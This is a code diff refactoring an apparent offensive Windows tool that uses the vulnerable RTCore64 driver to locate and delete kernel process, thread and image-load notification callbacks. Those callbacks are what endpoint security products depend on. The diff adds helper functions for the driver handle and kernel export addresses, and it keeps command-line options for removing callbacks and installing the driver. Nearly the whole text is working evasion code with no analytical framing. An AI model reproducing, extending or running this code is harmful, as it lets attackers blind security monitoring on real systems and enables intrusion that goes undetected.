@@ -300,21 +300,42 @@ struct Offsets getVersionOffsets() {
     }
 
 }
-void findimgcallbackroutine(DWORD64 remove) {
-    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+HANDLE GetDriverHandle(){
+
+    HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     if (Device == INVALID_HANDLE_VALUE) {
         Log("[!] Unable to obtain a handle to the device object");
-        return;
+        return Device;
+        exit;
     }
-    Log("[+] Device object handle obtained: %p", Device);
-    const auto NtoskrnlBaseAddress = Findkrnlbase();
+    else {
+        Log("[+] Device object handle obtained: %p", Device);
+        return Device;
+    }
+
+}
+
+DWORD64 GetFunctionAddress(LPCSTR function) {
+
+    DWORD64 Ntoskrnlbaseaddress = Findkrnlbase();
     HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
-    const DWORD64 PsSetLoadImageNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetLoadImageNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
+    DWORD64 Offset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, function)) - reinterpret_cast<DWORD64>(Ntoskrnl);
+    DWORD64 address = Ntoskrnlbaseaddress + Offset;
     FreeLibrary(Ntoskrnl);
-    const DWORD64 PsSetLoadImageNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetLoadImageNotifyRoutineOffset;
+    Log("[+] %s address: %p", function, address);
+    Log("[+] Kernel base address: %p", Ntoskrnlbaseaddress);
+    return address;
+
+}
+
+void findimgcallbackroutine(DWORD64 remove) {
+
     Offsets offsets = getVersionOffsets();
-    Log("[+] PsSetLoadImageNotifyRoutine address: %p", PsSetLoadImageNotifyRoutineAddress);
-    Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);
+    const auto Device = GetDriverHandle();
+    
+    DWORD64 PsSetLoadImageNotifyRoutineAddress = GetFunctionAddress("PsSetLoadImageNotifyRoutine");
+
     const DWORD64 PspLoadImageNotifyRoutineAddress = PsSetLoadImageNotifyRoutineAddress + offsets.image;
     Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
     Log("[+] Enumerating image load callbacks");
@@ -336,20 +357,12 @@ void findimgcallbackroutine(DWORD64 remove) {
 }
 
 void findthreadcallbackroutine(DWORD64 remove) {
-    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
-    if (Device == INVALID_HANDLE_VALUE) {
-        Log("[!] Unable to obtain a handle to the device object");
-        return;
-    }
-    Log("[+] Device object handle obtained: %p", Device);
-    const auto NtoskrnlBaseAddress = Findkrnlbase();
-    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
-    const DWORD64 PsSetCreateThreadNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetCreateThreadNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
-    FreeLibrary(Ntoskrnl);
-    const DWORD64 PsSetCreateThreadNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetCreateThreadNotifyRoutineOffset;
+    
     Offsets offsets = getVersionOffsets();
-    Log("[+] PsSetCreateThreadNotifyRoutine address: %p", PsSetCreateThreadNotifyRoutineAddress);
-    Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);
+    const auto Device = GetDriverHandle();
+    
+    const DWORD64 PsSetCreateThreadNotifyRoutineAddress = GetFunctionAddress("PsSetCreateThreadNotifyRoutine");
+    
     const DWORD64 PspCreateThreadNotifyRoutineAddress = PsSetCreateThreadNotifyRoutineAddress + offsets.thread;
     Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
     Log("[+] Enumerating thread creation callbacks");
@@ -371,25 +384,11 @@ void findthreadcallbackroutine(DWORD64 remove) {
 }
 
 void findprocesscallbackroutine(DWORD64 remove) {
-    //getVersionOffsets();
-
-    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
-    if (Device == INVALID_HANDLE_VALUE) {
-        Log("[!] Unable to obtain a handle to the device object");
-        return;
-    }
-    Log("[+] Device object handle obtained: %p", Device);
-    const auto NtoskrnlBaseAddress = Findkrnlbase();
-
-    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
-    const DWORD64 PsSetCreateProcessNotifyRoutineOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsSetCreateProcessNotifyRoutine")) - reinterpret_cast<DWORD64>(Ntoskrnl);
-    FreeLibrary(Ntoskrnl);
-    const DWORD64 PsSetCreateProcessNotifyRoutineAddress = NtoskrnlBaseAddress + PsSetCreateProcessNotifyRoutineOffset;
-
-    Log("[+] PsSetCreateProcessNotifyRoutine address: %p", PsSetCreateProcessNotifyRoutineAddress);
-    Log("[+] Kernel base address: %p", NtoskrnlBaseAddress);
-
+   
     Offsets offsets = getVersionOffsets();
+    const auto Device = GetDriverHandle();
+    const DWORD64 PsSetCreateProcessNotifyRoutineAddress = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");
+
     const DWORD64 PspCreateProcessNotifyRoutineAddress = PsSetCreateProcessNotifyRoutineAddress + offsets.process;
 
     Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
@@ -410,7 +409,7 @@ void findprocesscallbackroutine(DWORD64 remove) {
     }
 }
 //TO DO: clean up some stuff and implement functions for some common tasks: 
-// getDriverHandle()
+
 // getExportedFunction()
 
 
@@ -447,7 +446,6 @@ int main(int argc, char* argv[]) {
     else if (strcmp(argv[1] + 1, "delproc") == 0 && argc == 3) {
         DWORD64 remove;
         remove = strtoull(argv[2], NULL, 16);
-        Log("[+] Removing process creation callback: %p", remove);
         findprocesscallbackroutine((DWORD64)remove);
     }
     else if (strcmp(argv[1] + 1, "installDriver") == 0) {
@@ -469,13 +467,11 @@ int main(int argc, char* argv[]) {
     else if (strcmp(argv[1] + 1, "delthread") == 0 && argc == 3) {
         DWORD64 remove;
         remove = strtoull(argv[2], NULL, 16);
-        Log("[+] Removing thread creation callback: %p", remove);
         findthreadcallbackroutine((DWORD64)remove);
     }
     else if (strcmp(argv[1] + 1, "delimg") == 0 && argc == 3) {
         DWORD64 remove;
         remove = strtoull(argv[2], NULL, 16);
-        Log("[+] Removing image load callback: %p", remove);
         findimgcallbackroutine((DWORD64)remove);
     }
     else {
